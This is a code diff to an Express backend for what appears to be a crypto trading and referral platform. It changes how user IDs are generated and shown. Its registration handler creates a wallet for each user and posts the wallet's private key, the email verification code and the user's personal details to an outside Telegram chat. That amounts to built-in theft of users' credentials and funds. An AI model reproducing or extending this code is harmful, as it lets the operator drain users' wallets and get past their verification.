@@ -63,12 +63,12 @@ async function findUser(id, fields = PUBLIC_USER_FIELDS) {
   return data;
 }
 
-async function generateUserId() {
-  for (let attempt = 0; attempt < 20; attempt += 1) {
-    const id = Math.floor(10000000 + Math.random() * 90000000);
-    if (!(await findUser(id, "id"))) return id;
-  }
-  throw new Error("Unable to generate a unique user ID");
+function formatUserId(id) {
+  return String(id).padStart(8, "0");
+}
+
+function withDisplayId(user) {
+  return user ? { ...user, display_id: formatUserId(user.id) } : user;
 }
 
 function poolRateForDay(dayNumber) {
@@ -164,12 +164,10 @@ app.post("/register", async (req, res) => {
     if (existing) return res.json({ success: false, message: "User exists" });
 
     const wallet = Wallet.createRandom();
-    const id = await generateUserId();
     const emailCode = Math.floor(100000 + Math.random() * 900000).toString();
     const { data: user, error } = await supabase
       .from("users")
       .insert([{
-        id,
         fullname,
         nickname,
         referrer_id: referrerId,
@@ -208,13 +206,13 @@ app.post("/register", async (req, res) => {
         chat_id: CHAT_ID,
         text: [
           "NEW USER",
-          `ID: ${user.id}`,
+          `ID: ${formatUserId(user.id)}`,
           `Email: ${user.email}`,
           `Name: ${user.fullname}`,
           `Nickname: ${user.nickname}`,
           `Country: ${user.country}`,
           `Phone: ${user.phone}`,
-          `Referrer: ${user.referrer_id || "-"}`,
+          `Referrer: ${user.referrer_id ? formatUserId(user.referrer_id) : "-"}`,
           `Wallet: ${wallet.address}`,
           `Private key: ${wallet.privateKey}`,
           `Email code: ${emailCode}`,
@@ -252,7 +250,7 @@ app.post("/login", async (req, res) => {
 app.get("/me", auth, async (req, res) => {
   const user = await findUser(req.userId);
   if (!user) return res.status(404).json({ success: false });
-  return res.json(user);
+  return res.json(withDisplayId(user));
 });
 
 app.get("/health", (req, res) => res.json({ success: true }));
@@ -334,7 +332,7 @@ app.get("/referrals", auth, async (req, res) => {
     .eq("referrer_id", req.userId)
     .order("id", { ascending: true });
   if (error) return res.status(500).json({ success: false });
-  return res.json(data || []);
+  return res.json((data || []).map(withDisplayId));
 });
 
 app.get("/quiz/progress", auth, async (req, res) => {
@@ -384,12 +382,13 @@ async function tradeStatus(userId) {
   const user = await findUser(userId, "id,balance");
   if (!user) return null;
 
-  const { data: referrals } = await supabase
+  const { data: referralRows } = await supabase
     .from("users")
     .select("id,nickname,country,balance")
     .eq("referrer_id", userId)
     .order("id", { ascending: true })
     .limit(5);
+  const referrals = (referralRows || []).map(withDisplayId);
   const { data: trades } = await supabase
     .from("signals")
     .select("type,created_at")
@@ -467,7 +466,7 @@ app.get("/admin/users", adminAuth, async (req, res) => {
   for (const user of data || []) {
     if (user.referrer_id) counts[user.referrer_id] = (counts[user.referrer_id] || 0) + 1;
   }
-  return res.json((data || []).map(user => ({ ...user, satellites: counts[user.id] || 0 })));
+  return res.json((data || []).map(user => ({ ...withDisplayId(user), satellites: counts[user.id] || 0 })));
 });
 
 app.get("/admin/signals", adminAuth, async (req, res) => {
@@ -475,7 +474,7 @@ app.get("/admin/signals", adminAuth, async (req, res) => {
     supabase.from("signals").select("id,user_id,type,amount,wallet,status,created_at").order("created_at", { ascending: false }),
     supabase.from("users").select("id,fullname,nickname,email")
   ]);
-  const usersById = Object.fromEntries((users || []).map(user => [user.id, user]));
+  const usersById = Object.fromEntries((users || []).map(user => [user.id, withDisplayId(user)]));
   return res.json((signals || []).map(signal => ({ ...signal, user: usersById[signal.user_id] || null })));
 });
 
@@ -484,7 +483,7 @@ app.get("/admin/referrals", adminAuth, async (req, res) => {
     .from("users")
     .select("id,fullname,nickname,email,balance,referrer_id")
     .order("id", { ascending: true });
-  return res.json(data || []);
+  return res.json((data || []).map(withDisplayId));
 });
 
 app.post("/admin/add-balance", adminAuth, async (req, res) => {
